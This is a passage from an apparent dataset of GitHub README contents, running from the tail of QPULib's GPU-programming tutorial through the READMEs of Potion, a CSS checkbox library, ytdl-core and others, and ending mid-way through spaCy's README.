`gather`\nrequests: each call to `gather` will enqueue the FIFO, and each call\nto `receive` will dequeue it.  This means that a maximum of four\n`gather` calls may be issued before a `receive` must be called.\n\nNon-blocking stores are not as powerfull, but they are\nstill useful:\n\n  * Given vector of addresses `p` and a vector `x`,\n    the statement `store(x, p)` will write\n    vector `x` to memory beginning at the first address in `p`.\n\nUnlike the statement `*p = x`, the statement `store(p, x)` will not\nwait until `x` has been written.  However, any subsequent call to\n`store` will wait until the previous store has completed.  (Future\nimprovements to QPULib could allow several outstanding stores instead of\njust one.)\n\nWe are now ready to implement a vectorised rotation routine that\noverlaps memory access with computation:\n\n```c++\nvoid rot3D(Int n, Float cosTheta, Float sinTheta, Ptr<Float> x, Ptr<Float> y)\n{\n  \/\/ Function index() returns vector <0 1 2 ... 14 15>\n  Ptr<Float> p = x + index();\n  Ptr<Float> q = y + index();\n  \/\/ Pre-fetch first two vectors\n  gather(p); gather(q);\n\n  Float xOld, yOld;\n  For (Int i = 0, i < n, i = i+16)\n    \/\/ Pre-fetch two vectors for the *next* iteration\n    gather(p+16); gather(q+16);\n    \/\/ Receive vectors for *this* iteration\n    receive(xOld); receive(yOld);\n    \/\/ Store results\n    store(xOld * cosTheta - yOld * sinTheta, p);\n    store(yOld * cosTheta + xOld * sinTheta, q);\n    p = p+16; q = q+16;\n  End\n\n  \/\/ Discard pre-fetched vectors from final iteration\n  receive(xOld); receive(yOld);\n}\n```\n\nWhile the outputs from one iteration are being computed and written to\nmemory, the inputs for the *next* iteration are being loaded *in\nparallel*.\n\n### Vector version 3: multiple QPUs\n\nQPULib provides a simple mechanism to execute the same kernel on\nmultiple QPUs in parallel: before invoking a kernel `k`, call\n`k.setNumQPUs(n)` to use `n` QPUs.\nFor this to be useful the programmer needs a way to tell\neach QPU to compute a different part of the overall result.\nAccordingly,\nQPULib provides the `me()` function which returns the unique id of the\nQPU that called it.  More specifically, `me()` returns a vector of\ntype `Int` with all elements holding the QPU id.  In addition, the\n`numQPUs()` function returns the number of QPUs that are executing the\nkernel.  A QPU id will always lie in the range `0` to `numQPUs()-1`.\n\nNow, to spread the `rot3D` computation accross multiple QPUs we will\nuse a loop increment of `16*numQPUs()` instead of `16`, and offset the\ninitial pointers `x` and `y` by `16*me()`.\n\n```c++\nvoid rot3D(Int n, Float cosTheta, Float sinTheta, Ptr<Float> x, Ptr<Float> y)\n{\n  Int inc = numQPUs() << 4;\n  Ptr<Float> p = x + index() + (me() << 4);\n  Ptr<Float> q = y + index() + (me() << 4);\n  gather(p); gather(q);\n\n  Float xOld, yOld;\n  For (Int i = 0, i < n, i = i+inc)\n    gather(p+inc); gather(q+inc);\n    receive(xOld); receive(yOld);\n    store(xOld * cosTheta - yOld * sinTheta, p);\n    store(yOld * cosTheta + xOld * sinTheta, q);\n    p = p+inc; q = q+inc;\n  End\n\n  \/\/ Discard pre-fetched vectors from final iteration\n  receive(xOld); receive(yOld);\n}\n```\n\n### Performance\n\nTimes taken to rotate an object with 192,000 vertices:\n\n  Version  | Number of QPUs | Run-time (s) |\n  ---------| -------------: | -----------: |\n  Scalar   | 0              | 0.018        |\n  Vector 1 | 1              | 0.040        |\n  Vector 2 | 1              | 0.018        |\n  Vector 3 | 1              | 0.018        |\n  Vector 3 | 2              | 0.016        |\n\nNon-blocking loads and stores (vector version 2) give a\nsignificant performance boost: in this case a factor of 2.\n\nUnforunately, the program does not scale well to multiple QPUs.  I'm\nnot entirely sure why, but my suspicion is that the compute-to-memory\nratio is too low: we do only 2 arithmetic operations for every memory\naccess, perhaps overwhelming the memory subsystem.  If there are\npossibilities for QPULib to generate better code here, hopefully they\nwill be discovered in due course.  (Do let me know if you\nhave any suggestions.)\n\n## Example 3: 2D Convolution (Heat Transfer)\n\nLet's move to a somewhat more substantial example: modelling the heat\nflow across a 2D surface.  [Newton's law of\ncooling](https:\/\/en.wikipedia.org\/wiki\/Newton%27s_law_of_cooling)\nstates that an object cools at a rate proportional to the difference\nbetween its temperature `T` and the temperature of its environment (or\nambient temperature) `A`:\n\n```\ndT\/dt = \u2212k(T \u2212 A)\n```\n\nWhen simulating this equation below, we will consider each point on\nour 2D surface to be a seperate object, and the ambient temperature of\neach object to be the average of the temperatures of the 8 surrounding\nobjects.  This is very similar to 2D convolution using a mean filter.\n\n### Scalar version\n\nThe following function simulates a single time-step of the\ndifferential equation, applied to each object in the 2D grid.\n\n```c++\nvoid step(float** grid, float** gridOut, int width, int height)\n{\n  for (int y = 1; y < height-1; y++) {\n    for (int x = 1; x < width-1; x++) {\n      float surroundings =\n        grid[y-1][x-1] + grid[y-1][x]   + grid[y-1][x+1] +\n        grid[y][x-1]   +                  grid[y][x+1]   +\n        grid[y+1][x-1] + grid[y+1][x]   + grid[y+1][x+1];\n      surroundings *= 0.125;\n      gridOut[y][x] = grid[y][x] - (K * (grid[y][x] - surroundings));\n    }\n  }\n}\n```\n\nIf we apply heat at the north and east edges of our 2D surface, and\ncold at the south and west edges, then after of several simulation\nsteps we get:\n\n<img src=\"Doc\/heat.png\" alt=\"Heat flow across 2D surface\" width=30%>\n\n### Vector version\n\nBefore vectorising the simulation routine, we will introduce the idea\nof a **cursor** which is useful for implementing sliding window\nalgorithms.  A cursor points to a window of three continguous vectors\nin memory: `prev`, `current` and `next`.\n\n```\n  cursor  ------>  +---------+---------+---------+\n                   |  prev   | current |  next   |\n                   +---------+---------+---------+\n                 +0:      +16:      +32:      +48:\n```\n\nand supports three main operations:\n\n  1. **advance** the cursor by one vector, i.e. slide the window right\n     by one vector;\n\n  2. **shift-left** the `current` vector by one element,\n     using the value of the `next` vector;\n\n  3. **shift-right** the `current` vector by one element,\n     using the value of the `prev` vector.\n\nHere is a QPULib implementation of a cursor, using a C++ class.\n\n```c++\nclass Cursor {\n  Ptr<Float> cursor;\n  Float prev, current, next;\n\n public:\n\n  \/\/ Initialise to cursor to a given pointer\n  \/\/ and fetch the first vector.\n  void init(Ptr<Float> p) {\n    gather(p);\n    current = 0;\n    cursor = p+16;\n  }\n\n  \/\/ Receive the first vector and fetch the second.\n  \/\/ (prime the software pipeline)\n  void prime() {\n    receive(next);\n    gather(cursor);\n  }\n\n  \/\/ Receive the next vector and fetch another.\n  void advance() {\n    cursor = cursor+16;\n    prev = current;\n    gather(cursor);\n    current = next;\n    receive(next);\n  }\n\n  \/\/ Receive final vector and don't fetch any more.\n  void finish() {\n    receive(next);\n  }\n\n  \/\/ Shift the current vector left one element\n  void shiftLeft(Float& result) {\n    result = rotate(current, 15);\n    Float nextRot = rotate(next, 15);\n    Where (index() == 15)\n      result = nextRot;\n    End\n  }\n\n  \/\/ Shift the current vector right one element\n  void shiftRight(Float& result) {\n    result = rotate(current, 1);\n    Float prevRot = rotate(prev, 1);\n    Where (index() == 0)\n      result = prevRot;\n    End\n  }\n};\n```\n\nGiven a vector `x`, the QPULib operation `rotate(x, n)` will rotate\n`x` right by `n` places where `n` is a integer in the range 0 to 15.\nNotice that rotating right by 15 is the same as rotating left by 1.\n\nNow, using cursors the vectorised simulation step is expressed below.\nA slight structural difference from the scalar version is that we no\nlonger treat the grid as a 2D array: it is now 1D array with a `pitch`\nparameter that gives the increment needed to get from the start of one\nrow to the start of the next.\n\n```C++\nvoid step(Ptr<Float> grid, Ptr<Float> gridOut, Int pitch, Int width, Int height)\n{\n  Cursor row[3];\n  grid = grid + pitch*me() + index();\n\n  \/\/ Skip first row of output grid\n  gridOut = gridOut + pitch;\n\n  For (Int y = me(), y < height, y=y+numQPUs())\n    \/\/ Point p to the output row\n    Ptr<Float> p = gridOut + y*pitch;\n\n    \/\/ Initilaise three cursors for the three input rows\n    for (int i = 0; i < 3; i++) row[i].init(grid + i*pitch);\n    for (int i = 0; i < 3; i++) row[i].prime();\n\n    \/\/ Compute one output row\n    For (Int x = 0, x < width, x=x+16)\n\n      for (int i = 0; i < 3; i++) row[i].advance();\n\n      Float left[3], right[3];\n      for (int i = 0; i < 3; i++) {\n        row[i].shiftLeft(right[i]);\n        row[i].shiftRight(left[i]);\n      }\n\n      Float sum = left[0] + row[0].current + right[0] +\n                  left[1] +                  right[1] +\n                  left[2] + row[2].current + right[2];\n\n      store(row[1].current - K * (row[1].current - sum * 0.125), p);\n      p = p + 16;\n\n    End\n\n    \/\/ Cursors are finished for this row\n    for (int i = 0; i < 3; i++) row[i].finish();\n\n    \/\/ Move to the next input rows\n    grid = grid + pitch*numQPUs();\n  End\n}\n```\n\n### Performance\n\nTimes taken to simulate a 512x512 surface for 2000 steps:\n\n  Version | Number of QPUs | Run-time (s) |\n  --------| -------------: | -----------: |\n  Scalar  | 0              | 431.46       |\n  Vector  | 1              | 49.34        |\n  Vector  | 2              | 24.91        |\n  Vector  | 4              | 20.36        |\n\n\n## References\n\nThe following works were *very* helpful in the development of\nQPULib.\n\n  * The [VideoCore IV manual](http:\/\/www.broadcom.com\/docs\/support\/videocore\/VideoCoreIV-AG100-R.pdf) by Broadcom.\n\n  * The [documentation, demos, and\n    assembler](https:\/\/github.com\/hermanhermitage\/videocoreiv-qpu)\n    by Herman Hermitage.\n\n  * The [FFT implementation](http:\/\/www.aholme.co.uk\/GPU_FFT\/Main.htm)\n    by Andrew Holme.\n"},{"repo":"\/shichuan\/javascript-patterns","language":"HTML","readme_contents":"#JavaScript Patterns\n\n<img src=\"http:\/\/shichuan.github.io\/javascript-patterns\/img\/js-patterns.png\" alt=\"JS Patterns\" title=\"JS Patterns\" \/>\n<br \/>\nProject page at: <a href=\"http:\/\/shichuan.github.io\/javascript-patterns\" target=\"_blank\">http:\/\/shichuan.github.io\/javascript-patterns<\/a>\n\n"},{"repo":"\/perl11\/potion","language":"C","readme_contents":"## ~ readme ~\n\n         .ooo\n          'OOOo\n      ~ p ooOOOo tion ~\n          .OOO\n           oO      %% a little\n             Oo    fast language.\n            'O\n             `\n            (o)\n        ___\/ \/\n       \/`    \\\n      \/v^  `  ,\n     (...v\/v^\/\n      \\..\/::\/\n       \\\/::\/\n\n[![Build Status](https:\/\/api.travis-ci.org\/perl11\/potion.svg)](https:\/\/travis-ci.org\/perl11\/potion) [![Coverity Status](https:\/\/scan.coverity.com\/projects\/6934\/badge.svg)](https:\/\/scan.coverity.com\/projects\/perl11-potion) [perl11.org\/potion\/](http:\/\/perl11.org\/potion\/)\n\n## ~ potion ~\n\nPotion is an object- and mixin-oriented (traits)\nlanguage.\n\nIts exciting points are:\n\n * Just-in-time compilation to x86 and x86-64\n   machine code function pointers. This means\n   she's a speedy one. Who integrates very\n   well with C extensions.\n\n   The JIT is turned on by default and is\n   considered the primary mode of operation.\n\n * Intermediate bytecode format and VM. Load\n   and dump code. Decent speed and cross-\n   architecture. Heavily based on Lua's VM.\n\n * A lightweight generational GC, based on\n   Basile Starynkevitch's work on Qish, with\n   ~4ms per GC on average with < 100MB heaps.\n   <http:\/\/starynkevitch.net\/Basile\/qishintro.html>\n\n * Bootstrapped \"id\" object model, based on\n   Ian Piumarta's soda languages. This means\n   everything in the language, including\n   object allocation and interpreter state\n   are part of the object model.\n   (See COPYING for citations.)\n\n * Interpreter is thread-safe and reentrant.\n   I hope this will facilitate coroutines,\n   parallel interpreters and sandboxing.\n\n * Small. Under 10kloc. Right now we're like\n   6,000 or something. Install sloccount\n   and run: make sloc.\n\n * Reified AST and bytecode structures. This\n   is very important to me. By giving access\n   to the parser and compiler, it allows people\n   to target other platforms, write code analysis\n   tools and even fully bootstrapped VMs. I'm\n   not as concerned about the Potion VM being\n   fully bootstrapped, especially as it is tied\n   into the JIT so closely.\n\n * Memory-efficient classes. Stored like C\n   structs. (Although the method lookup table\n   can be used like a hash for storing arbitrary\n   data.)\n\n * The JIT is also used to speed up some other\n   bottlenecks. For example, instance variable\n   and method lookup tables are compiled into\n   machine code.\n\nHowever, some warnings:\n\n * Strings are immutable (like Lua) and byte\n   arrays are used for I\/O buffers.\n\n * Limited platform support for coroutines.\n   This affects exceptions. I'm and feeling\n   rather uninspired on the matter. Let's hear\n   from you.\n\n * The parser is not GC safe. This affects eval.\n   Do not waste too much memory inside eval.\n\n * No OS threads yet.\n\n\n## ~ a whiff of potion ~\n\n    5 times: \"Odelay!\" print.\n\nOr,\n\n    add = (x, y): x + y.\n    add(2, 4) string print\n\nOr,\n\n    hello =\n      \"(x): ('hello ', x) print.\" eval\n    hello ('world')\n\n\n## ~ building and installing ~\n\n    $ make\n\nLook inside the file called INSTALL for options.\n\n\n## ~ how it transpired ~\n\nThis isn't supposed to happen!\n\nI started playing with Lua's internals and reading\nstuff by Ian Piumarta and Nicolas Cannasse. And I,\nwell... I don't know how this happened!\n\nTurns out making a language is a lovely old time,\nyou should try it. If you keep it small, fit the\nVM and the parser and the stdlib all into 10k\nlines, then it's no sweat.\n\nTo be fair, I'd been tinkering with the parser\nfor years, though.\n\n\n## ~ the potion pledge ~\n\nEVERYTHING IS AN OBJECT.\nHowever, OBJECTS AREN'T EVERYTHING.\n\n(And, incidentally, everything is a function.)\n\n\n## ~ items to understand ~\n\n1. A traditional object is a tuple of data\n   and methods: (D, M).\n   \n   D is kept in the object itself.\n   M is kept in classes.\n\n2. In Potion, objects are just D.\n\n3. Every object has an M.\n\n4. But M can be altered, swapped,\n   added to, removed from, whatever.\n\n5. Objects do not have classes.\n   The M is a mixin, a collection\n   of methods.\n\nExample: all strings have a \"length\"\nmethod. This method comes with Potion.\nIt's in the String mixin.\n\n6. You can swap out mixins for the span\n   of a single source file.\n\nExample: you could give all strings a\n\"backwards\" method. But just for the\ncode inside your test.pn script.\n\n7. You can re-mix for the span of a\n   single closure.\n\nTo sum up:\n\nEVERYTHING IS AN OBJECT.\nEVEN MIXINS ARE OBJECTS.\nAND, OF COURSE, CLOSURES ARE OBJECTS.\n\nHowever, OBJECTS AREN'T EVERYTHING.\nTHEY ARE USELESS WITHOUT MIXINS.\n\n\n## ~ unique ideas (to be implemented) ~\n\nPotion does have a few unique features\nunderway.\n\n* It is two languages in one.\n\nThe language itself is objects and closures.\n\n    Number add = (x): self + x.\n\nBut it also includes a data language.\n\n    app = [window (width=200, height=400)\n      [button \"OK\", button \"Cancel\"]]\n    \nThe code and data languages can be interleaved\nover and over again. In a way, I'm trying to find\na middle ground between s-expressions and stuff like\nE4X. I like that s-expressions are a very light data\nsyntax, but I like that E4X clearly looks like data.\n\nWhen s-expressions appear in Lisp code, they look\nlike code. I think it is nice to distinguish the two.\n\n* Deeply nested blocks can be closed quickly.\nI don't like significant whitespace, personally.\nBut I don't like end end end end.\n\n    say = (phrase):\n      10 times (i):\n        20 times (j):\n          phrase print\n    _say\n\nThe closing \"_ say\" ends the block saved to \"say\" var.\n\nNormally, blocks are closed with a period. In this case\nwe'd need three periods, which looks strange.\n\n    say = ():\n      10 times:\n        20 times:\n          \"Odelay!\" print\n    ...\n\nIf you prefer, you can give it some space. Or you can\nuse a variable name introduced by the block,\n\n    say = (phrase):\n      10 times (i):\n        20 times (j):\n          phrase print\n    _ phrase\n\n\n    say = (phrase):\n      10 times (i):\n        20 times (j):\n          phrase print\n      _ i\n    .\n\nMaybe it all looks strange. I don't know. I'm just trying\nthings out, okay?\n\n* Elimination of line noise.\n\n  I avoid @, #, $, %, {}.\n  Stick with ., |, (), [], =, !, ?. Easier on the eyes.\n  These are common punctuations in English.\n\n* I try to defer to English when it comes to punctuation rules.\n\nPeriod means \"end\". (In other langs it means \"method call\".)\nComma breaks up statements.\nSpace between messages gives a noun-verb feeling.\n\n    window open (width=400, height=500)\n\n\n* Named block args.\n\n\n    (1, 2, 3) map (item=x, index=i): i display, x + 1.\n\n\n* Assign is match + bind really (~ planned ~).\n\nAssignments are side-effects only, but here extended.  Atoms on the\nleft-hand side (lhs) are trivial, but we prefer the power of LISP's\ndestructuring-bind within macros, or prolog or elixirs matching. So\n= is actually a match operator which will recursively check if the\nexpressions on both left and right side match, and binds all found\nlhs variables.\n\n    (1, x) = (1, 2) => (x=2)\n    (1, x) = (2, 3) => false\n    1 = 2           => false\n\n_ is a special variable which matches everything, but is never bound,\n| seperates the head and tail from a list or lick.\n\nSo we can check trees like this:\n\n    (_, x, 2)   = (0, 1, 2)   and say x #=> 1\n    [_, [x, 1]] = [0, [1, 2]] and say x #=> 1\n    [_, x]      = [0, [1, 2]] and say x #=> [1, 2]\n    [_ | x]     = [0, 1, 2]   and say x #=> [1, 2]\n\n    fun = (a, b): [0, [a, b]].\n    [_ | [x, 1]] = fun(1, 2)  and say x #=> 1\n\n## ~ feverish and fond thankyous ~\n\nwhy is gravely indebted to Basile Starynkevitch, who fielded\nquestions about his garbage collector. why favors French hackers\nto an extreme (Xavier Leroy, Nicolas Cannasse, Guy Decoux,\nMathieu Bochard to name only a portion of those I admire) and\nis very glad to represent their influence in Potion's garbage\ncollector.\n\nMatz, for answering why's questions about conservative GC and\nfor encouraging him so much. Potion's stack scanning code and\nsome of the object model come from Ruby.\n\nSteve Dekorte for the Io language, libgarbagecollector and\nlibcoroutine -- I referred frequently to all of them in\nsorting out what he wanted.\n\nOf course, Mauricio Fernandez for his inspiring programming journal\nhoused at\nhttp:\/\/web.archive.org\/web\/20110814062722\/http:\/\/eigenclass.org\/R2\/\nand for works derived throughout the course of it -- extprot most of\nall.  Many of my thoughts about language internals (object repr, GC,\netc.) are informed by him.\n\nIan Piumarta for peg\/leg. We use a re-entrant custom version\nof it, but the original library is sheer minimalist parsing\namazement.\n\nFinal appreciations to Jonathan Wright and William Morgan\nwho pitched in, back in the wee hours of Potion's history.\nThanks.\n\n\n## ~ license ~\n\nSee COPYING for legal information. It's an MIT license,\nwhich lets you do anything you want with this. I'm hoping\nthat makes it very nice for folks who want to embed a little\nPotion in their app!\n\n"},{"repo":"\/hunzaboy\/CSS-Checkbox-Library","language":"HTML","readme_contents":"<a href=\"https:\/\/hunzaboy.github.io\/CSS-Checkbox-Library\/\">Click Here for Demo<\/a>\n\n# Tons of Checkboxes\nA huge collection of pure css checkboxes.\n\n<img src=\"https:\/\/hunzaboy.github.io\/CSS-Checkbox-Library\/screen.png\">\n\n<a href=\"https:\/\/hunzaboy.github.io\/CSS-Checkbox-Library\/\">Click Here for Demo<\/a>\n\n## Compatible\nIE9+, Chrome 49+, Firefox 52+, Safari 5+\n\n## How to use\n1. Install via NPM  `npm i css-checkbox-library` or Download the Zip\n2. Import the `checkboxes.min.css` or `checkboxes.css` file from the `dist` folder.\n3. Use the checkbox design you like with the following markup. In the example below the class `ckbx-square-1` is important.\n\n```HTML\n<div class=\"ckbx-square-1\">\n  <input type=\"checkbox\" checked id=\"ckbx-square-1-2\" value=\"0\" name=\"ckbx-square-1\">\n  <label for=\"ckbx-square-1-2\"><\/label>\n<\/div>\n```\n\nThat's it. \n\n<strong>You can checkout the <a href=\"https:\/\/hunzaboy.github.io\/CSS-Checkbox-Library\/\">DEMO<\/a> to get HTML Code for each design. Just press the HTML button.<\/strong>\n\n<a href='https:\/\/ko-fi.com\/W7W112WHD' target='_blank'><img height='36' style='border:0px;height:36px;' src='https:\/\/az743702.vo.msecnd.net\/cdn\/kofi1.png?v=2' border='0' alt='Buy Me a Coffee at ko-fi.com' \/><\/a>\n\n## Todo\n\n- [x] ~~Circles, Squares~~\n- [x] ~~Toggles~~\n- [x] HTML Code Snippet\n- [x] Added Different Sizes\n- [ ] Color Variations\n- [ ] More Animations\n- [ ] Just for Fun Toggles\n"},{"repo":"\/fent\/node-ytdl-core","language":"HTML","readme_contents":"# node-ytdl-core\n[![Dependency Status](https:\/\/david-dm.org\/fent\/node-ytdl-core.svg)](https:\/\/david-dm.org\/fent\/node-ytdl-core)\n[![codecov](https:\/\/codecov.io\/gh\/fent\/node-ytdl-core\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/fent\/node-ytdl-core)\n[![Discord](https:\/\/img.shields.io\/discord\/484464227067887645.svg)](https:\/\/discord.gg\/V3vSCs7)\n\nYet another youtube downloading module. Written with only Javascript and a node-friendly streaming interface.\n\n# Support\nYou can contact us for support on our [chat server](https:\/\/discord.gg\/V3vSCs7)\n\n# Usage\n\n```js\nconst fs = require('fs');\nconst ytdl = require('ytdl-core');\n\/\/ TypeScript: import ytdl from 'ytdl-core'; with --esModuleInterop\n\/\/ TypeScript: import * as ytdl from 'ytdl-core'; with --allowSyntheticDefaultImports\n\/\/ TypeScript: import ytdl = require('ytdl-core'); with neither of the above\n\nytdl('http:\/\/www.youtube.com\/watch?v=A02s8omM_hI')\n  .pipe(fs.createWriteStream('video.flv'));\n```\n\n\n# API\n### ytdl(url, [options])\n\nAttempts to download a video from the given url. Returns a [readable stream](https:\/\/nodejs.org\/api\/stream.html#stream_class_stream_readable). `options` can have the following keys\n\n* `quality` - Video quality to download. Can be an [itag value](http:\/\/en.wikipedia.org\/wiki\/YouTube#Quality_and_formats), a list of itag values, or `highest`\/`lowest`\/`highestaudio`\/`lowestaudio`\/`highestvideo`\/`lowestvideo`. `highestaudio`\/`lowestaudio`\/`highestvideo`\/`lowestvideo` all prefer audio\/video only respectively. Defaults to `highest`.\n* `filter` - Used to decide what format to download. Can be `audioandvideo` to filter formats that contain both video and audio, `video` to filter for formats that contain video, or `videoonly` for formats that contain video and no additional audio track. Can also be `audio` or `audioonly`. You can give a filtering function that gets called with each format available. This function is given the `format` object as its first argument, and should return true if the format is preferable.\n* `format` - Primarily used to download specific video or audio streams. This can be a specific `format` object returned from `getInfo`.\n  * Supplying this option will ignore the `filter` and `quality` options since the format is explicitly provided.\n* `range` - A byte range in the form `{start: INT, end: INT}` that specifies part of the file to download, ie {start: 10355705, end: 12452856}.\n  * This downloads a portion of the file, and not a separately spliced video.\n* `begin` - What time in the video to begin. Supports formats `00:00:00.000`, `0ms, 0s, 0m, 0h`, or number of milliseconds. Example: `1:30`, `05:10.123`, `10m30s`. For live videos, this also accepts a unix timestamp or Date, and defaults to `Date.now()`.\n  * This option is not very reliable, see [#129](https:\/\/github.com\/fent\/node-ytdl-core\/issues\/129), [#219](https:\/\/github.com\/fent\/node-ytdl-core\/issues\/219).\n* `liveBuffer` - How much time buffer to use for live videos in milliseconds. Default is `20000`.\n* `requestOptions` - Anything to merge into the request options which [miniget](https:\/\/github.com\/fent\/node-miniget) is called with, such as headers.\n* `highWaterMark` - How much of the video download to buffer into memory. See [node's docs](https:\/\/nodejs.org\/api\/stream.html#stream_constructor_new_stream_writable_options) for more.\n* `lang` - The 2 character symbol of a language. Default is `en`.\n\n```js\n\/\/ Example with `filter` option.\nytdl(url, { filter: (format) => format.container === 'mp4' })\n  .pipe(fs.createWriteStream('video.mp4'));\n```\n\n#### Event: info\n* [`ytdl.videoInfo`](example\/info.json) - Info.\n* [`ytdl.videoFormat`](typings\/index.d.ts#L22) - Video Format.\n\nEmitted when the a video's `info` hash is fetched, along with the chosen format metadata to download. `format.url` might be different if `start` was given.\n\n#### Event: response\n* [`http.ServerResponse`](https:\/\/nodejs.org\/api\/http.html#http_class_http_serverresponse) - Response.\n\nEmitted when the video response has been found and has started downloading or after any successful reconnects. Can be used to get the size of the download.\n\n#### Event: progress\n* `number` - Chunk byte length.\n* `number` - Total bytes or segments downloaded.\n* `number` - Total bytes or segments.\n\nEmitted whenever a new chunk is received. Passes values describing the download progress.\n\n### Stream#destroy()\n\nCall to abort and stop downloading a video.\n\n### ytdl.getBasicInfo(url, [options], [callback(err, info)])\n\nUse this if you only want to get metainfo from a video. If `callback` isn't given, returns a promise.\n\n### ytdl.getInfo(url, [options], [callback(err, info)])\n\nGets metainfo from a video. Includes additional formats, and ready to download deciphered URL. This is what the `ytdl()` function uses internally. If `callback` isn't given, returns a promise.\n\n### ytdl.downloadFromInfo(info, options)\n\nOnce you have received metadata from a video with the `ytdl.getInfo` function, you may pass that information along with other options to this function.\n\n### ytdl.chooseFormat(formats, options)\n\nCan be used if you'd like to choose a format yourself with the [options above](#ytdlurl-options).\n\n```js\n\/\/ Example of choosing a video format.\nytdl.getInfo(videoID, (err, info) => {\n  if (err) throw err;\n  let format = ytdl.chooseFormat(info.formats, { quality: '134' });\n  if (format) {\n    console.log('Format found!');\n  }\n});\n```\n\n### ytdl.filterFormats(formats, filter)\n\nIf you'd like to work with only some formats, you can use the [`filter` option above](#ytdlurl-options).\n\n```js\n\/\/ Example of filtering the formats to audio only.\nytdl.getInfo(videoID, (err, info) => {\n  if (err) throw err;\n  let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');\n  console.log('Formats with only audio: ' + audioFormats.length);\n});\n```\n\n### ytdl.validateID(id)\n\nReturns true if the given string satisfies YouTube's ID format.\n\n### ytdl.validateURL(url)\n\nReturns true if able to parse out a valid video ID.\n\n### ytdl.getURLVideoID(url)\n\nReturns a video ID from a YouTube URL.\n\n### ytdl.getVideoID(str)\n\nSame as the above `ytdl.getURLVideoID()`, but can be called with the video ID directly, in which case it returns it. This is what ytdl uses internally.\n\n## Limitations\n\nytdl cannot download videos that fall into the following\n* Regionally restricted (requires a [proxy](example\/proxy.js))\n* Private\n* Rentals\n\nYouTube intentionally rate limits downloads, particularly audio only formats, likely to prevent bandwidth abuse. The download rate is still faster than a media player can play the video, even on 2x. See [#294](https:\/\/github.com\/fent\/node-ytdl-core\/issues\/294).\n\nGenerated download links are valid for 6 hours, for the same IP address.\n\n## Handling Separate Streams\n\nTypically 1080p or better video does not have audio encoded with it. The audio must be downloaded separately and merged via an appropriate encoding library. `ffmpeg` is the most widely used tool, with many [Node.js modules available](https:\/\/www.npmjs.com\/search?q=ffmpeg). Use the `format` objects returned from `ytdl.getInfo` to download specific streams to combine to fit your needs. Look at [example\/ffmpeg.js](example\/ffmpeg.js) for an example on doing this.\n\n## What if it stops working?\n\nYoutube updates their website all the time, it's not that rare for this to stop working. If it doesn't work for you and you're using the latest version, feel free to open up an issue. Make sure to check if there isn't one already with the same error.\n\nIf you'd like to help fix the issue, look at the type of error first. The most common one is\n\n    Could not extract signature deciphering actions\n\nRun the tests at `test\/irl-test.js` just to make sure that this is actually an issue with ytdl-core.\n\n    mocha test\/irl-test.js\n\nThese tests are not mocked, and they actually try to start downloading a few videos. If these fail, then it's time to debug.\n\nFor getting started with that, you can look at the `extractActions()` function in [`\/lib\/sig.js`](https:\/\/github.com\/fent\/node-ytdl-core\/blob\/master\/lib\/sig.js).\n\n\n# Install\n\n```bash\nnpm install ytdl-core@latest\n```\n\nOr for Yarn users:\n```bash\nyarn add ytdl-core@latest\n```\n\nIf you're using a bot or app that uses ytdl-core, it may be dependent on an older version. Make sure you're installing the latest version of ytdl-core to keep up with the latest fixes.\n\n# Related Projects\n\n- [ytdl](https:\/\/github.com\/fent\/node-ytdl) - A cli wrapper of this.\n- [pully](https:\/\/github.com\/JimmyBoh\/pully) - Another cli wrapper of this aimed at high quality formats.\n- [ytsr](https:\/\/github.com\/TimeForANinja\/node-ytsr) - YouTube video search results.\n- [ytpl](https:\/\/github.com\/TimeForANinja\/node-ytpl) - YouTube playlist and channel resolver.\n\n\n# Tests\nTests are written with [mocha](https:\/\/mochajs.org)\n\n```bash\nnpm test\n```\n"},{"repo":"\/sux13\/DataScienceSpCourseNotes","language":"HTML","readme_contents":"# Data Science Specialization Course Notes\n\nI have compiled notes for all 9 courses of the Johns Hopkins Unversity\/Coursera Data Science Specialization. The notes are all written in **R Markdown** format and cover all concepts convered in class, as well as additional examples I have compiled from lecture, my own exploration, _StackOverflow_, and _Khan Academy_. These documents are intended to be comprehensive sources of reference for future use and they have served me wonderfully in completing the assignments for each course. So I hope you will find them helpful as well. \n\nThey are by no means perfect, so feel free to correct, contribute (send a pull request), or use them in anyway you would like. \n\nYou will find **HTML**, **PDF**, and **R Markdown** files here in this repository in each of the corresponding folders. You can view the HTML versions [here](http:\/\/sux13.github.io\/DataScienceSpCourseNotes\/)\n\nIf you have any questions, drop me an email at s.xing@me.com\n"},{"repo":"\/explosion\/spaCy","language":"Python","readme_contents":"<a href=\"https:\/\/explosion.ai\"><img src=\"https:\/\/explosion.ai\/assets\/img\/logo.svg\" width=\"125\" height=\"125\" align=\"right\" \/><\/a>\n\n# spaCy: Industrial-strength NLP\n\nspaCy is a library for advanced Natural Language Processing in Python and\nCython. It's built on the very latest research, and was designed from day one to\nbe used in real products. spaCy comes with\n[pretrained statistical models](https:\/\/spacy.io\/models) and word vectors, and\ncurrently supports tokenization for **50+ languages**. It features\nstate-of-the-art speed, convolutional **neural network models** for tagging,\nparsing and **named entity recognition** and easy **deep learning** integration.\nIt's commercial open-source software, released under the MIT license.\n\n\ud83d\udcab **Version 2.2 out now!**\n[Check out the release notes here.](https:\/\/github.com\/explosion\/spaCy\/releases)\n\n[![Azure Pipelines](<https:\/\/img.shields.io\/azure-devops\/build\/explosion-ai\/public\/8\/master.svg?logo=azure-pipelines&style=flat-square&label=build+(3.x)>)](https:\/\/dev.azure.com\/explosion-ai\/public\/_build?definitionId=8)\n[![Travis Build Status](<https:\/\/img.shields.io\/travis\/explosion\/spaCy\/master.svg?style=flat-square&logo=travis-ci&logoColor=white&label=build+(2.7)>)](https:\/\/travis-ci.org\/explosion\/spaCy)\n[![Current Release Version](https:\/\/img.shields.io\/github\/release\/explosion\/spacy.svg?style=flat-square&logo=github)](https:\/\/github.com\/explosion\/spaCy\/releases)\n[![pypi Version](https:\/\/img.shields.io\/pypi\/v\/spacy.svg?style=flat-square&logo=pypi&logoColor=white)](https:\/\/pypi.org\/project\/spacy\/)\n[![conda Version](https:\/\/img.shields.io\/conda\/vn\/conda-forge\/spacy.svg?style=flat-square&logo=conda-forge&logoColor=white)](https:\/\/anaconda.org\/conda-forge\/spacy)\n[![Python wheels](https:\/\/img.shields.io\/badge\/wheels-%E2%9C%93-4c1.svg?longCache=true&style=flat-square&logo=python&logoColor=white)](https:\/\/github.com\/explosion\/wheelwright\/releases)\n[![PyPi 